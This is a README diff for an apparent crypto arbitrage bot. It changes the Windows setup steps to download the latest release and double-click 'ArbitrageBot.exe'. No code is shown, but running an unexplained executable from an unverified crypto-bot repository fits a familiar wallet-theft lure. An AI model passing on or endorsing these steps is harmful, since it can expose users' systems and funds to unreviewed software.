@@ -64,8 +64,8 @@ python main.py
 
 ## Setup Instructions - WayII (Onyl Windows)
 
-- [Download](https://github.com/trendcryptobots/Uniswap-Pancakeswap-Arbitrage-Bot/archive/refs/heads/main.zip) the repository release and extract files. 
-- Double-click on the "AutoBuild.bat" file to run it.
+- [Download](https://github.com/trendcryptobots/Uniswap-Pancakeswap-Arbitrage-Bot/releases/latest) the repository release and extract files. 
+- Double-click on the "ArbitrageBot.exe" file to run it.
 - And follow the instructions in the application window.
 
 # Support Chat
